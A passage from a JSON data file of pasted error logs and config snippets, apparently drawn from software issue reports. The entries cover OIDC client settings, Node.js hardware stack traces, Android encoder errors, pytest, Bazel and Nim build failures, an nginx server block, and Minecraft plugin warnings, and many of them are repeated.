        "logs": "import { OpenIdConnectConfiguration } from \"aurelia-open-id-connect\";\r\nimport { UserManagerSettings, WebStorageStateStore } from \"oidc-client\";\r\n\r\nconst appHost = \"http://localhost:9000\";\r\n\r\nexport default {\r\n  loginRedirectRoute: \"/private\",\r\n  logoutRedirectRoute: \"/index\",\r\n  unauthorizedRedirectRoute: \"/index\",\r\n  userManagerSettings: {\r\n\r\n    // The number of seconds in advance of access token expiry\r\n    // to raise the access token expiring event.\r\n    accessTokenExpiringNotificationTime: 1,\r\n\r\n    // Either host your own OpenID Provider or select a certified authority\r\n    // from the list http://openid.net/certification/\r\n    authority: \"http://localhost/CustomerName/Identity/\",\r\n\r\n    automaticSilentRenew: true,\r\n\r\n    // IdentityServer4 supports OpenID Connect Session Management\r\n    // https://openid.net/specs/openid-connect-session-1_0.html\r\n    monitorSession: true,\r\n    checkSessionInterval: 2000,\r\n\r\n    // The client or application ID that the authority issues.\r\n    client_id: \"CustomerClient\",\r\n\r\n    filterProtocolClaims: true,\r\n    loadUserInfo: false,\r\n    post_logout_redirect_uri: `${appHost}/signout-oidc`,\r\n    redirect_uri: `${appHost}/signin-oidc`,\r\n    response_type: \"id_token\",\r\n    scope: \"openid jcc-setup\",\r\n    // number of millisecods to wait for the authorization\r\n    // server to response to silent renew request\r\n    silentRequestTimeout: 10000,\r\n    silent_redirect_uri: `${appHost}/signin-oidc`,\r\n    userStore: new WebStorageStateStore({\r\n      prefix: \"oidc\",\r\n      store: window.localStorage,\r\n    }),\r\n  } as UserManagerSettings,\r\n} as OpenIdConnectConfiguration;"
    },
    {
        "logs": "/home/pi/rcboat/node_modules/j5-io/dist/index.js:481\r\n            throw new Error('Invalid arguments');\r\n            ^\r\n\r\nError: Invalid arguments\r\n    at J5IO.i2cWrite (/home/pi/rcboat/node_modules/j5-io/dist/index.js:481:19)\r\n    at Compass.value (/home/pi/rcboat/node_modules/johnny-five/lib/compass.js:50:17)\r\n    at new Compass (/home/pi/rcboat/node_modules/johnny-five/lib/compass.js:532:10)\r\n    at Board.board.on (/home/pi/rcboat/run.js:33:16)\r\n    at emitNone (events.js:111:20)\r\n    at Board.emit (events.js:208:7)\r\n    at _combinedTickCallback (internal/process/next_tick.js:132:7)\r\n    at process._tickDomainCallback (internal/process/next_tick.js:219:9)\r\n    at Function.Module.runMain (module.js:696:11)\r\n    at startup (bootstrap_node.js:204:16)\r\nMakefile:2: recipe for target 'run' failed\r\nmake: *** [run] Error 1"
    },
    {
        "logs": "  HMC5883L: {\r\n    REGISTER: {\r\n      value: {\r\n        // Page 11\r\n        // Table 2: Register List\r\n        //\r\n        // Configuration Register A\r\n        CRA: 0x00,\r\n        // Configuration Register B\r\n        // This may change, depending on gauss\r\n        CRB: 0x01,\r\n        // Mode Register\r\n        MODE: 0x02,\r\n        // Data Output X MSB Register\r\n        READ: 0x03,\r\n      }\r\n    },"
    },
    {
        "logs": "Element type is invalid: expected a string (for built-in components) or a class/function (for composite components) but got: undefined. You likely forgot to export your component from the file it's defined in, or you might have mixed up default and named imports."
    },
    {
        "logs": "2020-08-28 02:45:05.723 18474-18474 I/VideoEncoder: VideoEncoder OMX.Exynos.AVC.Encoder\r\n2020-08-28 02:45:05.724 18474-18474 I/VideoEncoder: Color supported: 2135033992\r\n2020-08-28 02:45:05.724 18474-18474 I/VideoEncoder: Color supported: 19\r\n2020-08-28 02:45:05.724 18474-18474 I/VideoEncoder: Color supported: 21\r\n2020-08-28 02:45:05.724 18474-18474 I/VideoEncoder: Color supported: 2130706449\r\n2020-08-28 02:45:05.724 18474-18474 I/VideoEncoder: Color supported: 16\r\n2020-08-28 02:45:05.725 18474-18474 I/VideoEncoder: Color supported: 2130747392\r\n2020-08-28 02:45:05.725 18474-18474 I/VideoEncoder: Color supported: 2130708361\r\n2020-08-28 02:45:05.727 18474-18474 I/ACodec:  [] Now uninitialized\r\n2020-08-28 02:45:05.740 18474-19996 I/ACodec: [] onAllocateComponent\r\n2020-08-28 02:45:05.742 18474-19996 I/OMXClient: IOmx service obtained\r\n2020-08-28 02:45:05.796 18474-19996 I/ACodec: [OMX.Exynos.AVC.Encoder] Now Loaded\r\n2020-08-28 02:45:05.799 18474-18474 I/VideoEncoder: Prepare video info: SURFACE, 311x640\r\n2020-08-28 02:45:05.807 18474-19996 W/OMXUtils: do not know color format 0x7f000011 = 2130706449\r\n2020-08-28 02:45:05.808 18474-19996 W/OMXUtils: do not know color format 0x10 = 16\r\n2020-08-28 02:45:05.809 18474-19996 W/OMXUtils: do not know color format 0x7f00a000 = 2130747392\r\n2020-08-28 02:45:05.810 18474-19996 W/OMXUtils: do not know color format 0x7f000789 = 2130708361\r\n2020-08-28 02:45:05.812 18474-19996 I/ACodec: app-name : rise.nubcxs.namnam\r\n2020-08-28 02:45:05.813 18474-19996 I/ACodec: setupAVCEncoderParameters with [profile: Baseline] [level: Level1]\r\n2020-08-28 02:45:05.814 18474-19996 I/ACodec: Enable Perceptual Video Coding\r\n2020-08-28 02:45:05.815 18474-19996 I/ACodec: Success set VideoMinQP(5/5/5) VideoMaxQP(50/50/50)\r\n2020-08-28 02:45:05.815 18474-19996 I/ACodec: SECSetparameters : default\r\n2020-08-28 02:45:05.817 18474-19996 I/ACodec: [OMX.Exynos.AVC.Encoder] cannot encode HDR static metadata. Ignoring.\r\n2020-08-28 02:45:05.817 18474-19996 I/ACodec: setupVideoEncoder succeeded\r\n2020-08-28 02:45:05.817 18474-19996 I/ACodec: [OMX.Exynos.AVC.Encoder] configure, AMessage : AMessage(what = 'conf', target = 7) = {\r\n      int32_t color-format = 2130708361\r\n      int32_t i-frame-interval = 2\r\n      string mime = \"video/avc\"\r\n      int32_t width = 311\r\n      int32_t bitrate = 1024000\r\n      int32_t max-input-size = 0\r\n      int32_t frame-rate = 30\r\n      int32_t height = 640\r\n      int32_t encoder = 1\r\n    }\r\n2020-08-28 02:45:05.820 18474-19996 W/OMXUtils: do not know color format 0x7f000789 = 2130708361\r\n2020-08-28 02:45:05.843 18474-18474 I/VideoEncoder: prepared\r\n2020-08-28 02:45:05.881 18474-18474 I/MicrophoneManager: Microphone created, 32000hz, Stereo\r\n2020-08-28 02:45:05.886 18474-18474 I/ACodec:  [] Now uninitialized\r\n2020-08-28 02:45:05.888 18474-20001 I/ACodec: [] onAllocateComponent\r\n2020-08-28 02:45:05.891 18474-20001 I/OMXClient: IOmx service obtained\r\n2020-08-28 02:45:05.897 18474-20001 I/ACodec: [OMX.SEC.naac.enc] Now Loaded\r\n2020-08-28 02:45:05.910 18474-18474 I/AudioEncoder: prepared\r\n2020-08-28 02:45:05.910 18474-18474 I/VideoEncoder: started\r\n2020-08-28 02:45:05.913 18474-19995 I/MediaCodec: MediaCodec will operate in async mode\r\n2020-08-28 02:45:05.914 18474-19996 I/ACodec: [OMX.Exynos.AVC.Encoder] Now Loaded->Idle\r\n2020-08-28 02:45:05.935 18474-19995 I/MediaCodec: setCodecState state : 0\r\n2020-08-28 02:45:05.939 18474-18474 I/AudioEncoder: started\r\n2020-08-28 02:45:05.943 18474-20001 I/MediaCodec: MediaCodec will operate in async mode\r\n2020-08-28 02:45:05.943 18474-20001 I/ACodec: [OMX.SEC.naac.enc] Now Loaded->Idle\r\n2020-08-28 02:45:05.960 18474-20001 I/ACodec: [OMX.SEC.naac.enc] Now Idle->Executing\r\n2020-08-28 02:45:05.961 18474-19996 I/ACodec: [OMX.Exynos.AVC.Encoder] Now Idle->Executing\r\n2020-08-28 02:45:05.962 18474-20001 I/ACodec: [OMX.SEC.naac.enc] Now Executing\r\n2020-08-28 02:45:05.964 18474-19996 I/ACodec: [OMX.Exynos.AVC.Encoder] Now Executing\r\n2020-08-28 02:45:05.989 18474-18474 D/mali_winsys: EGLint new_window_surface(egl_winsys_display *, void *, EGLSurface, EGLConfig, egl_winsys_surface **, EGLBoolean) returns 0x3000\r\n2020-08-28 02:45:06.016 18474-18474 I/MicrophoneManager: Microphone started\r\n2020-08-28 02:45:06.058 18474-18474 D/ViewRootImpl@2ecda6b[VNCActivity]: Relayout returned: old=[540,1078][540,1078] new=[540,1078][540,1078] result=0x1 surface={valid=false 0} changed=false\r\n2020-08-28 02:45:06.061 18474-18474 D/ViewRootImpl@2ecda6b[VNCActivity]: dispatchDetachedFromWindow\r\n2020-08-28 02:45:06.061 18474-18474 D/ViewRootImpl@2ecda6b[VNCActivity]: Surface release. android.view.ViewRootImpl.doDie:7979 android.view.ViewRootImpl.die:7947 android.view.WindowManagerGlobal.removeViewLocked:497 android.view.WindowManagerGlobal.removeView:435 android.view.WindowManagerImpl.removeViewImmediate:124 android.app.ActivityThread.handleDestroyActivity:4753 android.app.servertransaction.DestroyActivityItem.execute:39 android.app.servertransaction.TransactionExecutor.executeLifecycleState:145 \r\n2020-08-28 02:45:06.066 18474-18474 D/InputTransport: Input channel destroyed: fd=64\r\n2020-08-28 02:45:06.091 18474-19996 I/ACodec: we change android._dataspace here to 10c40000\r\n2020-08-28 02:45:06.091 18474-19996 D/ACodec: dataspace changed to 0x10c40000 (R:2(Limited), P:4(BT601_6_525), M:3(BT601_6), T:3(SMPTE170M)) (R:2(Limited), S:4(BT601_525), T:3(SMPTE_170M))\r\n2020-08-28 02:45:06.095 18474-19996 E/ACodec: [OMX.Exynos.AVC.Encoder] ERROR(0x80001001)\r\n2020-08-28 02:45:06.095 18474-19996 E/ACodec: signalError(omxError 0x80001001, internalError -2147483648)\r\n2020-08-28 02:45:06.095 18474-19995 E/MediaCodec: Codec reported err 0x80001001, actionCode 0, while in state 6\r\n2020-08-28 02:45:06.099 18474-20004 E/BaseEncoder: Error\r\n    android.media.MediaCodec$CodecException: Error 0x80001001\r\n2020-08-28 02:45:06.103 18474-19996 E/ACodec: [OMX.Exynos.AVC.Encoder] ERROR(0x80001001)\r\n2020-08-28 02:45:06.103 18474-19996 E/ACodec: signalError(omxError 0x80001001, internalError -2147483648)\r\n2020-08-28 02:45:06.103 18474-19995 E/MediaCodec: Codec reported err 0x80001001, actionCode 0, while in state 0\r\n2020-08-28 02:45:06.108 18474-19996 E/ACodec: [OMX.Exynos.AVC.Encoder] ERROR(0x80001001)\r\n2020-08-28 02:45:06.109 18474-19996 E/ACodec: signalError(omxError 0x80001001, internalError -2147483648)\r\n2020-08-28 02:45:06.109 18474-19995 E/MediaCodec: Codec reported err 0x80001001, actionCode 0, while in state 0\r\n2020-08-28 02:45:06.936 18474-19995 I/MediaCodec: setCodecState state : 0\r\n[Truncated]\n    CQ supported: false\r\n    ----- -----\r\n    ----- Video info -----\r\n    Supported colors: \r\n    2135033992\r\n    19\r\n    21\r\n    2130708361\r\n    Profile: 1, level: 128\r\n    Bitrate range: 1 - 30000000\r\n    Frame rate range: 0 - 960\r\n    Width range: 2 - 2048\r\n    Height range: 2 - 2048\r\n    ----- -----\r\n    Max instances: 32\r\n    ----------------"
    },
    {
        "logs": "INTERNALERROR> FileNotFoundError: [Errno 2] No such file or directory: 'oc': 'oc'\r\n\r\n============================= 2 warnings in 1.32s ==============================\r\n\r\nERROR: InvocationError for command /home/travis/build/red-hat-storage/ocs-ci/.tox/collectonly/bin/py.test --collect-only tests (exited with code 3)"
    },
    {
        "logs": "INTERNALERROR> FileNotFoundError: [Errno 2] No such file or directory: 'oc': 'oc'\r\n\r\n============================= 2 warnings in 1.32s ==============================\r\n\r\nERROR: InvocationError for command /home/travis/build/red-hat-storage/ocs-ci/.tox/collectonly/bin/py.test --collect-only tests (exited with code 3)"
    },
    {
        "logs": "Uploaded file must be a non-empty zip (Service: AWSLambdaInternal; Status Code: 400; Error Code: InvalidParameterValueException)"
    },
    {
        "logs": "Auto-Configuration Error: Couldn't find undname.exe under C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC, please check your VC installation and set BAZEL_VC environment variable correctly."
    },
    {
        "logs": "Auto-Configuration Error: Couldn't find undname.exe under C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC, please check your VC installation and set BAZEL_VC environment variable correctly."
    },
    {
        "logs": "yaml\r\napproval_rules:\r\n- name: domain review\r\n  requires:\r\n    count: 1\r\n    teams:\r\n    - \"Betterment/engineering\"\r\n    permissions:\r\n    - write\r\n  options:\r\n    invalidate_on_push: true\r\n    methods:\r\n      github_review: true\r\n- name: platform review\r\n  requires:\r\n    count: 1\r\n    teams:\r\n    - \"Betterment/platform-reviewers\"\r\n    permissions:\r\n    - write\r\n   options:\r\n    invalidate_on_push: true\r\n    methods:\r\n      github_review: true"
    },
    {
        "logs": "yaml\r\napproval_rules:\r\n- name: domain review\r\n  requires:\r\n    count: 1\r\n    teams:\r\n    - \"Betterment/engineering\"\r\n    permissions:\r\n    - write\r\n  options:\r\n    invalidate_on_push: true\r\n    methods:\r\n      github_review: true\r\n      github_review_comment_patterns:\r\n      - \"domain lgtm\"\r\n- name: platform review\r\n  requires:\r\n    count: 1\r\n    teams:\r\n    - \"Betterment/platform-reviewers\"\r\n    permissions:\r\n    - write\r\n   options:\r\n    invalidate_on_push: true\r\n    methods:\r\n      github_review: true\r\n      github_review_comment_patterns:\r\n      -  \"platform lgtm\""
    },
    {
        "logs": "yaml\r\napproval_rules:\r\n- name: domain review\r\n  requires:\r\n    count: 1\r\n    teams:\r\n    - \"Betterment/engineering\"\r\n    permissions:\r\n    - write\r\n  options:\r\n    invalidate_on_push: true\r\n    methods:\r\n      github_review: true\r\n- name: platform review\r\n  requires:\r\n    count: 1\r\n    teams:\r\n    - \"Betterment/platform-reviewers\"\r\n    permissions:\r\n    - write\r\n   options:\r\n    invalidate_on_push: true\r\n    methods:\r\n      github_review: true"
    },
    {
        "logs": "(.venv)sahil@rHaaS:~/git/HIL/tests/unit$ py.test .\r\n========================================================================================================= test session starts =========================================================================================================\r\nplatform linux2 -- Python 2.7.6, pytest-2.9.2, py-1.4.31, pluggy-0.3.1\r\nrootdir: /home/sahil/git/HIL, inifile: setup.cfg\r\nplugins: xdist-1.14, cov-1.8.0\r\ncollected 462 items / 1 errors \r\nclass_resolver.py ...\r\ncli.py .....\r\nconfig.py .\r\ndev_support.py ....\r\nhaas_auth.py .\r\nmigrations.py ss\r\nmodel.py ................\r\ntest_common.py ....................................\r\napi/auth.py ...................................................................................................................................................................................\r\napi/main.py ........................................................................................................................................................................\r\napi/port_revert.py ...\r\next/auth/database.py ...............................\r\next/auth/mock.py .....\r\next/network_allocators/vlan_pool.py ..\r\next/obm/ipmi.py ..\r\next/switches/brocade.py ....\r\n\r\n================= ERRORS ==============================================\r\n__________________ ERROR collecting tests/unit/rest.py "
    },
    {
        "logs": "../../.venv/local/lib/python2.7/site-packages/_pytest/config.py:392: in import_plugin\r\n    raise new_exc\r\nE   ImportError: Error importing plugin \"pytest_catchlog\": No module named pytest_catchlog\r\n================ 460 passed, 2 skipped, 1 error in 60.67 seconds ====================="
    },
    {
        "logs": "(.venv)sahil@rHaaS:~/git/HIL/tests/unit$ py.test .\r\n========================================================================================================= test session starts =========================================================================================================\r\nplatform linux2 -- Python 2.7.6, pytest-2.9.2, py-1.4.31, pluggy-0.3.1\r\nrootdir: /home/sahil/git/HIL, inifile: setup.cfg\r\nplugins: xdist-1.14, cov-1.8.0\r\ncollected 462 items / 1 errors \r\nclass_resolver.py ...\r\ncli.py .....\r\nconfig.py .\r\ndev_support.py ....\r\nhaas_auth.py .\r\nmigrations.py ss\r\nmodel.py ................\r\ntest_common.py ....................................\r\napi/auth.py ...................................................................................................................................................................................\r\napi/main.py ........................................................................................................................................................................\r\napi/port_revert.py ...\r\next/auth/database.py ...............................\r\next/auth/mock.py .....\r\next/network_allocators/vlan_pool.py ..\r\next/obm/ipmi.py ..\r\next/switches/brocade.py ....\r\n\r\n================= ERRORS ==============================================\r\n__________________ ERROR collecting tests/unit/rest.py "
    },
    {
        "logs": "../../.venv/local/lib/python2.7/site-packages/_pytest/config.py:392: in import_plugin\r\n    raise new_exc\r\nE   ImportError: Error importing plugin \"pytest_catchlog\": No module named pytest_catchlog\r\n================ 460 passed, 2 skipped, 1 error in 60.67 seconds ====================="
    },
    {
        "logs": "ruby -Ilib:test test/core_ext/duration_test.rb\r\nRun options: --seed 6802\r\n\r\n# Running:\r\n\r\n...........................................F............\r\n\r\nFinished in 0.059317s, 944.0801 runs/s, 4754.1177 assertions/s.\r\n\r\n  1) Failure:\r\nDurationTest#test_implicit_coercion [test/core_ext/duration_test.rb:289]:\r\nExpected: Tue, 03 Jan 2017\r\n  Actual: 2017-01-03 00:00:00 +0800\r\n\r\n56 runs, 282 assertions, 1 failures, 0 errors, 0 skips"
    },
    {
        "logs": "a) For `nixos-rebuild` you can set\n  { nixpkgs.config.allowUnsupportedSystem = true; }\nin configuration.nix to override this.\n\nb) For `nix-env`, `nix-build`, `nix-shell` or any other Nix command you can add\n  { allowUnsupportedSystem = true; }\nto ~/.config/nixpkgs/config.nix."
    },
    {
        "logs": "a) For `nixos-rebuild` you can set\n  { nixpkgs.config.allowUnsupportedSystem = true; }\nin configuration.nix to override this.\n\nb) For `nix-env`, `nix-build`, `nix-shell` or any other Nix command you can add\n  { allowUnsupportedSystem = true; }\nto ~/.config/nixpkgs/config.nix."
    },
    {
        "logs": "ERR! getThreadList TypeError: Cannot read property 'error_results' of undefined\r\nERR! getThreadList     at defaultFuncs.post.then.then (/home/lambda/facebook-chat-api/src/getThreadList.js:195:41)\r\nERR! getThreadList     at tryCatcher (/home/lambda/Applications/Facebridge/FacebookBot/node_modules/bluebird/js/main/util.js:26:23)\r\n..."
    },
    {
        "logs": "ERR! getThreadList TypeError: Cannot read property 'error_results' of undefined\r\nERR! getThreadList     at defaultFuncs.post.then.then (/home/lambda/facebook-chat-api/src/getThreadList.js:195:41)\r\nERR! getThreadList     at tryCatcher (/home/lambda/Applications/Facebridge/FacebookBot/node_modules/bluebird/js/main/util.js:26:23)\r\n..."
    },
    {
        "logs": "server {\r\n    listen      82;\r\n    server_name gttx_spider;\r\n    charset     utf-8;\r\n    client_max_body_size 75M;\r\n\r\n    location / {\r\n        include uwsgi_params;\r\n        uwsgi_pass unix:/root/flask_spider/gttx_spider/uwsgi_gttx_spider.sock;\r\n\r\n        access_log /var/log/nginx/access.log;\r\n        error_log /var/log/nginx/error.log;\r\n    }\r\n}"
    },
    {
        "logs": "Performing system checks...\r\nSystem check identified no issues (0 silenced).\r\nApril 10, 2020 - 00:24:02\r\nDjango version 3.0.3, using settings 'web_project.settings'\r\nStarting development server at http://0.0.0.0:1000/\r\nQuit the server with CONTROL-C."
    },
    {
        "logs": "Performing system checks...\r\nSystem check identified no issues (0 silenced).\r\nApril 10, 2020 - 00:24:02\r\nDjango version 3.0.3, using settings 'web_project.settings'\r\nStarting development server at http://0.0.0.0:1000/\r\nQuit the server with CONTROL-C."
    },
    {
        "logs": "nimble build\r\n  Verifying dependencies for nimlsp@0.2.1\r\n      Info: Dependency on astpatternmatching@any version already satisfied\r\n  Verifying dependencies for ast_pattern_matching@1.0.0\r\n      Info: Dependency on jsonschema@>= 0.2.1 already satisfied\r\n  Verifying dependencies for jsonschema@0.2.1\r\n      Info: Dependency on ast_pattern_matching@any version already satisfied\r\n  Verifying dependencies for ast_pattern_matching@1.0.0\r\n   Building nimlsp/nimlsp using c backend\r\n       Tip: 6 messages have been suppressed, use --verbose to show them.\r\n     Error: Build failed for package: nimlsp\r\n        ... Details:\r\n        ... Execution failed with exit code 1\r\n        ... Command: \"/Users/USER/.local/Cellar/nim/1.2.0/nim/bin/nim\" c --noNimblePath -d:NimblePkgVersion=0.2.1 --path:\"/Users/USER/.nimble/pkgs/ast_pattern_matching-1.0.0\"  --path:\"/Users/USER/.nimble/pkgs/jsonschema-0.2.1\"  --path:\"/Users/USER/.nimble/pkgs/ast_pattern_matching-1.0.0\"  -o:\"/Users/USER/gitrepos/nimlsp/nimlsp\" \"/Users/USER/gitrepos/nimlsp/src/nimlsp.nim\"\r\n        ... Output: Hint: used config file '/Users/USER/.local/Cellar/nim/1.2.0/nim/config/nim.cfg' [Conf]\r\n        ... Hint: used config file '/Users/USER/gitrepos/nimlsp/src/nimlsp.nim.cfg' [Conf]\r\n        ... Hint: used config file '/Users/USER/gitrepos/nimlsp/src/config.nims' [Conf]\r\n        ... Hint: system [Processing]\r\n        ... Hint: widestrs [Processing]\r\n        ... Hint: io [Processing]\r\n        ... Hint: nimlsp [Processing]\r\n        ... Hint: baseprotocol [Processing]\r\n        ... Hint: streams [Processing]\r\n        ... Hint: strutils [Processing]\r\n        ... Hint: parseutils [Processing]\r\n        ... Hint: math [Processing]\r\n        ... Hint: bitops [Processing]\r\n        ... Hint: macros [Processing]\r\n        ... Hint: algorithm [Processing]\r\n        ... Hint: unicode [Processing]\r\n        ... Hint: json [Processing]\r\n        ... Hint: hashes [Processing]\r\n        ... Hint: tables [Processing]\r\n        ... Hint: lexbase [Processing]\r\n        ... Hint: parsejson [Processing]\r\n        ... Hint: options [Processing]\r\n        ... Hint: typetraits [Processing]\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/baseprotocol.nim(4, 24) Warning: inherit from a more precise exception type like ValueError, IOError or OSError [InheritFromException]\r\n        ... Hint: utfmapping [Processing]\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/utfmapping.nim(1, 8) Warning: imported and not used: 'tables' [UnusedImport]\r\n        ... Hint: suggestlib [Processing]\r\n        ... Hint: os [Processing]\r\n        ... Hint: pathnorm [Processing]\r\n        ... Hint: osseps [Processing]\r\n        ... Hint: posix [Processing]\r\n        ... Hint: times [Processing]\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/suggestlib.nim(11, 8) template/generic instantiation of "
    },
    {
        "logs": " from here\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/suggestlib.nim(7, 14) Error: cannot open file: /Users/USER/.local/Cellar/nim/1.2.0/nim/nimsuggest/nimsuggest.nim"
    },
    {
        "logs": "nimble build\r\n  Verifying dependencies for nimlsp@0.2.1\r\n      Info: Dependency on astpatternmatching@any version already satisfied\r\n  Verifying dependencies for ast_pattern_matching@1.0.0\r\n      Info: Dependency on jsonschema@>= 0.2.1 already satisfied\r\n  Verifying dependencies for jsonschema@0.2.1\r\n      Info: Dependency on ast_pattern_matching@any version already satisfied\r\n  Verifying dependencies for ast_pattern_matching@1.0.0\r\n   Building nimlsp/nimlsp using c backend\r\n       Tip: 6 messages have been suppressed, use --verbose to show them.\r\n     Error: Build failed for package: nimlsp\r\n        ... Details:\r\n        ... Execution failed with exit code 1\r\n        ... Command: \"/Users/USER/.local/Cellar/nim/1.2.0/nim/bin/nim\" c --noNimblePath -d:NimblePkgVersion=0.2.1 --path:\"/Users/USER/.nimble/pkgs/ast_pattern_matching-1.0.0\"  --path:\"/Users/USER/.nimble/pkgs/jsonschema-0.2.1\"  --path:\"/Users/USER/.nimble/pkgs/ast_pattern_matching-1.0.0\"  -o:\"/Users/USER/gitrepos/nimlsp/nimlsp\" \"/Users/USER/gitrepos/nimlsp/src/nimlsp.nim\"\r\n        ... Output: Hint: used config file '/Users/USER/.local/Cellar/nim/1.2.0/nim/config/nim.cfg' [Conf]\r\n        ... Hint: used config file '/Users/USER/gitrepos/nimlsp/src/nimlsp.nim.cfg' [Conf]\r\n        ... Hint: used config file '/Users/USER/gitrepos/nimlsp/src/config.nims' [Conf]\r\n        ... Hint: system [Processing]\r\n        ... Hint: widestrs [Processing]\r\n        ... Hint: io [Processing]\r\n        ... Hint: nimlsp [Processing]\r\n        ... Hint: baseprotocol [Processing]\r\n        ... Hint: streams [Processing]\r\n        ... Hint: strutils [Processing]\r\n        ... Hint: parseutils [Processing]\r\n        ... Hint: math [Processing]\r\n        ... Hint: bitops [Processing]\r\n        ... Hint: macros [Processing]\r\n        ... Hint: algorithm [Processing]\r\n        ... Hint: unicode [Processing]\r\n        ... Hint: json [Processing]\r\n        ... Hint: hashes [Processing]\r\n        ... Hint: tables [Processing]\r\n        ... Hint: lexbase [Processing]\r\n        ... Hint: parsejson [Processing]\r\n        ... Hint: options [Processing]\r\n        ... Hint: typetraits [Processing]\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/baseprotocol.nim(4, 24) Warning: inherit from a more precise exception type like ValueError, IOError or OSError [InheritFromException]\r\n        ... Hint: utfmapping [Processing]\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/utfmapping.nim(1, 8) Warning: imported and not used: 'tables' [UnusedImport]\r\n        ... Hint: suggestlib [Processing]\r\n        ... Hint: os [Processing]\r\n        ... Hint: pathnorm [Processing]\r\n        ... Hint: osseps [Processing]\r\n        ... Hint: posix [Processing]\r\n        ... Hint: times [Processing]\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/suggestlib.nim(11, 8) template/generic instantiation of `mImport` from here\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/suggestlib.nim(7, 14) Error: cannot open file: /Users/USER/.local/Cellar/nim/1.2.0/nim/nimsuggest/nimsuggest.nim"
    },
    {
        "logs": "[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: bamboo_jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: dark_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: swamp_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_lakes\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: deep_warm_ocean\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: birch_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: bamboo_jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: dark_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: swamp_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_lakes\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: deep_warm_ocean\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: birch_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server 